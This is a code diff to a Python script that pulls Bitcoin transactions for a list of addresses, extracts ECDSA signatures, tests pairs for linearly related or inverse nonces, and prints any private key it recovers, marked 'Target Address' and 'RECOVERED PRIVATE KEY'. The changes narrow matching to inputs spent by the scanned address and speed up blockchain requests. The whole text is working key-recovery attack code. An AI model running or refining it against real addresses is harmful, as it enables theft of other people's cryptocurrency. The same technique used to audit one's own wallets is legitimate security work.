@@ -66,10 +66,11 @@ def modular_inverse(a, m):
 
 def scan_address_signatures(sigs, address):
     if len(sigs) < 2:
-        print(f"ℹ️ Address {address} only has {len(sigs)} signature. Skipping differential analysis.")
+        print(f"ℹ️ Address {address} only has {len(sigs)} signatures. Skipping differential analysis.")
         return
 
     print(f"🔬 Cross-analyzing {len(sigs)} signatures for address {address}...")
+    found_any = False
     
     for sig1, sig2 in itertools.combinations(sigs, 2):
         r1, s1, z1, tx1 = sig1["r"], sig1["s"], sig1["z"], sig1["txid"]
@@ -86,7 +87,6 @@ def scan_address_signatures(sigs, address):
         
         if inv_den_lin:
             x_lin = (num_lin * inv_den_lin) % N
-            # Verify mathematical correctness
             k1 = (z1 + r1 * x_lin) * modular_inverse(s1, N) % N
             k2 = (z2 + r2 * x_lin) * modular_inverse(s2, N) % N
             if (k2 - k1) % N == 1:
@@ -94,19 +94,18 @@ def scan_address_signatures(sigs, address):
                 print(f"  Target Address: {address}")
                 print(f"  TX 1: {tx1} | TX 2: {tx2}")
                 print(f"  🔑 RECOVERED PRIVATE KEY (HEX): {hex(x_lin)}")
+                found_any = True
                 continue
 
         # ----------------------------------------------------
         # TEST 2: INVERSE NONCE DETECTION (k2 = k1^-1 mod n)
         # ----------------------------------------------------
-        # Formula derivation for k1 * k2 = 1 mod n
         num_inv = (s1 * s2 * z2 - z1) % N
         den_inv = (r1 - s1 * s2 * r2) % N
         inv_den_inv = modular_inverse(den_inv, N)
         
         if inv_den_inv:
             x_inv = (num_inv * inv_den_inv) % N
-            # Verify mathematical correctness
             k1 = (z1 + r1 * x_inv) * modular_inverse(s1, N) % N
             k2 = (z2 + r2 * x_inv) * modular_inverse(s2, N) % N
             if (k1 * k2) % N == 1:
@@ -114,7 +113,11 @@ def scan_address_signatures(sigs, address):
                 print(f"  Target Address: {address}")
                 print(f"  TX 1: {tx1} | TX 2: {tx2}")
                 print(f"  🔑 RECOVERED PRIVATE KEY (HEX): {hex(x_inv)}")
+                found_any = True
                 continue
+
+    if not found_any:
+        print("  ✅ All checked pairs are clean of linear/inverse leaks.")
 
 def main():
     try:
@@ -124,7 +127,6 @@ def main():
         print(f"Error loading {INPUT_JSON}: {e}. Make sure to run chugary.py first.")
         return
 
-    # Group signatures by the Bitcoin address they belong to
     address_vault = {}
 
     print("Fetching active transaction payload states from blockchain history...")
@@ -141,6 +143,13 @@ def main():
             if not z_val: continue
 
             for vin in tx.get("vin", []):
+                # Critical update: check if the signature explicitly belongs to our monitored address
+                prevout = vin.get("prevout", {})
+                spending_address = prevout.get("scriptpubkey_address", "")
+                
+                if spending_address != address:
+                    continue # Skip inputs belonging to other people in multi-party transactions
+                
                 script_asm = vin.get("scriptsig_asm", "")
                 witness = vin.get("witness", [])
                 sig_hex = None
@@ -161,7 +170,7 @@ def main():
                             "s": s,
                             "z": z_val
                         })
-            time.sleep(0.1)
+            time.sleep(0.05)
 
     print("\n" + "="*60)
     print("RUNNING CRYPTANALYSIS TESTING MATRIX")
@@ -169,8 +178,6 @@ def main():
     
     for address, sigs in address_vault.items():
         scan_address_signatures(sigs, address)
-        
-    print("\nAnalysis complete.")
 
 if __name__ == "__main__":
     main()
